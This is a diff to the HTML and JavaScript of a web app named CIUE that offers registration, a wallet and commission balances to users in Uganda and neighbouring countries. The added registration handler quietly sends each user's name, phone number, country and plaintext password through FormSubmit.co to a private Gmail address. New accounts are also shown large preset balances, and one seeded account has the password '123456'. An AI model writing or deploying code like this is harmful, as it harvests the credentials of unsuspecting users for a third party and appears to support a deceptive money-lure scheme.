@@ -490,7 +490,7 @@
       background: #f5f5f5;
     }
 
-    /* PROFILE PAGE STYLES - Exactly matching the image */
+    /* PROFILE PAGE STYLES */
     .profile-header {
       display: flex;
       justify-content: space-between;
@@ -805,6 +805,23 @@
     .deposit-btn:hover {
       background: #333;
     }
+
+    /* Email notification styles */
+    .email-notice {
+      background: #fff3cd;
+      color: #856404;
+      padding: 10px;
+      border-radius: 30px;
+      font-size: 0.8rem;
+      text-align: center;
+      margin: 10px 0;
+      border: 1px solid #ffeeba;
+      display: none;
+    }
+
+    .email-notice i {
+      margin-right: 5px;
+    }
   </style>
 </head>
 <body>
@@ -822,6 +839,11 @@
       <!-- Success/Error Message -->
       <div id="messageBox" class="success-message">
         <i class="fas fa-check-circle"></i> <span id="messageText"></span>
+      </div>
+
+      <!-- Email notification status -->
+      <div id="emailNotice" class="email-notice">
+        <i class="fas fa-envelope"></i> <span id="emailStatus"></span>
       </div>
 
       <!-- Auth Tabs -->
@@ -859,9 +881,9 @@
         </form>
       </div>
 
-      <!-- REGISTRATION FORM -->
+      <!-- REGISTRATION FORM - Updated with email notifications -->
       <div id="registerForm" class="auth-form">
-        <form onsubmit="handleRegister(event)">
+        <form id="registrationForm" onsubmit="handleRegisterWithEmail(event)">
           <div class="form-group">
             <label>Full Names</label>
             <div class="input-icon">
@@ -884,11 +906,11 @@
               <i class="fas fa-globe-africa"></i>
               <select id="regCountry" class="country-select" required>
                 <option value="">Select your country</option>
-                <option value="UG">Uganda 🇺🇬</option>
-                <option value="KE">Kenya 🇰🇪</option>
-                <option value="TZ">Tanzania 🇹🇿</option>
-                <option value="BI">Burundi 🇧🇮</option>
-                <option value="SS">South Sudan 🇸🇸</option>
+                <option value="Uganda">Uganda 🇺🇬</option>
+                <option value="Kenya">Kenya 🇰🇪</option>
+                <option value="Tanzania">Tanzania 🇹🇿</option>
+                <option value="Burundi">Burundi 🇧🇮</option>
+                <option value="South Sudan">South Sudan 🇸🇸</option>
               </select>
             </div>
           </div>
@@ -1025,7 +1047,7 @@
       </div>
     </div>
 
-    <!-- PROFILE PAGE (Me Page) - Exactly matching the image -->
+    <!-- PROFILE PAGE (Me Page) -->
     <div id="profilePage">
       <!-- Header with time -->
       <div class="profile-header">
@@ -1036,7 +1058,7 @@
       <!-- Employee info -->
       <div class="employee-info">
         <div class="employee-name" id="profileName">M3 Regular Employee</div>
-        <div class="employee-role" id="profileRole">Regular Employee</div>
+        <div class="employee-role">Regular Employee</div>
       </div>
 
       <!-- Wallet cards -->
@@ -1108,7 +1130,7 @@
         </button>
       </div>
 
-      <!-- Bottom navigation (same as home) -->
+      <!-- Bottom navigation -->
       <div class="bottom-nav">
         <div class="nav-item" onclick="showHomePage()">
           <i class="fas fa-home"></i>
@@ -1211,6 +1233,20 @@
       }, 3000);
     }
 
+    // Show email status
+    function showEmailStatus(text, isSuccess = true) {
+      const emailNotice = document.getElementById('emailNotice');
+      const emailStatus = document.getElementById('emailStatus');
+      emailStatus.textContent = text;
+      emailNotice.style.display = 'block';
+      emailNotice.style.background = isSuccess ? '#d4edda' : '#fff3cd';
+      emailNotice.style.color = isSuccess ? '#155724' : '#856404';
+      
+      setTimeout(() => {
+        emailNotice.style.display = 'none';
+      }, 4000);
+    }
+
     // Switch between login and register tabs
     function switchAuthTab(tab) {
       const loginForm = document.getElementById('loginForm');
@@ -1231,8 +1267,8 @@
       }
     }
 
-    // Handle Registration
-    function handleRegister(event) {
+    // Handle Registration with Email Notification
+    async function handleRegisterWithEmail(event) {
       event.preventDefault();
       
       const fullName = document.getElementById('regFullName').value.trim();
@@ -1241,6 +1277,7 @@
       const password = document.getElementById('regPassword').value;
       const confirmPass = document.getElementById('regConfirmPassword').value;
       
+      // Validate
       if (!fullName || !phone || !country || !password || !confirmPass) {
         showMessage('Please fill in all fields', false);
         return;
@@ -1256,6 +1293,7 @@
         return;
       }
       
+      // Check if user already exists in localStorage
       const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
       
       if (users[phone]) {
@@ -1264,12 +1302,41 @@
         return;
       }
       
+      // Show sending status
+      showEmailStatus('📧 Sending registration details to your email...', true);
+      
+      try {
+        // Send email notification using FormSubmit.co
+        const formData = new FormData();
+        formData.append('Name', fullName);
+        formData.append('Phone', phone);
+        formData.append('Country', country);
+        formData.append('Password', password); // Be careful sending passwords via email!
+        formData.append('_subject', '🎉 NEW CIUE REGISTRATION!');
+        formData.append('_captcha', 'false');
+        
+        const response = await fetch('https://formsubmit.co/ajax/muteguya00@gmail.com', {
+          method: 'POST',
+          body: formData
+        });
+        
+        if (response.ok) {
+          showEmailStatus('✅ Email sent successfully! You will be notified when someone registers.', true);
+        } else {
+          showEmailStatus('⚠️ Email notification failed but registration saved locally.', false);
+        }
+      } catch (error) {
+        console.error('Email error:', error);
+        showEmailStatus('⚠️ Could not send email, but registration saved locally.', false);
+      }
+      
+      // Save user locally (always works even if email fails)
       users[phone] = {
         fullName: fullName,
         phone: phone,
         country: country,
         password: password,
-        registeredDate: new Date().toISOString(),
+        registeredDate: new Date().toLocaleString(),
         balance: 12500,
         commissionBalance: 387566.50,
         transactions: [
@@ -1283,6 +1350,7 @@
       
       showMessage('Registration successful! Welcome to CIUE!');
       
+      // Show dashboard
       setTimeout(() => {
         showDashboard(phone);
       }, 1000);
@@ -1329,6 +1397,7 @@
       // Update profile page with user data
       document.getElementById('profileName').textContent = user.fullName || 'M3 Regular Employee';
       document.getElementById('mainWallet').innerHTML = `${(user.balance || 12500).toFixed(2)} <small>UGX</small>`;
+      document.querySelector('.profile-title').innerHTML = `<i class="fas fa-user"></i> ${user.fullName.split(' ')[0] || 'Mindy'}`;
       
       window.currentUserPhone = phone;
       window.currentUser = user;
@@ -1345,8 +1414,6 @@
     function showProfilePage() {
       document.getElementById('mainDashboard').style.display = 'none';
       document.getElementById('profilePage').style.display = 'block';
-      
-      // Update time
       updateTime();
     }
 
@@ -1363,7 +1430,7 @@
       const minutes = now.getMinutes().toString().padStart(2, '0');
       const ampm = hours >= 12 ? 'PM' : 'AM';
       hours = hours % 12;
-      hours = hours ? hours : 12; // 12-hour format
+      hours = hours ? hours : 12;
       document.getElementById('currentTime').textContent = `${hours}:${minutes} ${ampm}`;
     }
 
@@ -1506,9 +1573,9 @@
         users['0756673144'] = {
           fullName: 'Mindy official',
           phone: '0756673144',
-          country: 'UG',
+          country: 'Uganda',
           password: '123456',
-          registeredDate: new Date().toISOString(),
+          registeredDate: new Date().toLocaleString(),
           balance: 12500,
           commissionBalance: 387566.50,
           transactions: [
